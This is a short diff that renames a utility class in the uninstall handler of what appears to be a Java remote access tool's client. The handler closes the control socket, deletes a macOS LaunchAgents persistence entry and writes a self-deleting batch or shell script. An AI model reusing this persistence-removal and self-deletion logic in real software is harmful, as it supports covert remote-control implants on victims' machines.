@@ -6,15 +6,15 @@ import java.util.Random;
 
 import com.redpois0n.Connection;
 import com.redpois0n.Main;
-import com.redpois0n.Util;
 import com.redpois0n.WinRegistry;
 import com.redpois0n.common.os.OperatingSystem;
+import com.redpois0n.utils.Utils;
 
 public class PacketUNINSTALL extends Packet {
 
 	@Override
 	public void read(String line) throws Exception {
-		File me = Util.getJarFile();
+		File me = Utils.getJarFile();
 
 		try {
 			Connection.socket.close();
@@ -36,7 +36,7 @@ public class PacketUNINSTALL extends Packet {
 				text += "del %0";
 				text = text.replace("\n", " & ");
 			} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX) {
-				new File(System.getProperty("user.home") + "/Library/LaunchAgents/" + Util.getJarFile().getName().replace(".jar", ".plist")).delete();
+				new File(System.getProperty("user.home") + "/Library/LaunchAgents/" + Utils.getJarFile().getName().replace(".jar", ".plist")).delete();
 				file = new File(fileName + ".sh");
 				
 				text += "#!bin/bash\n";
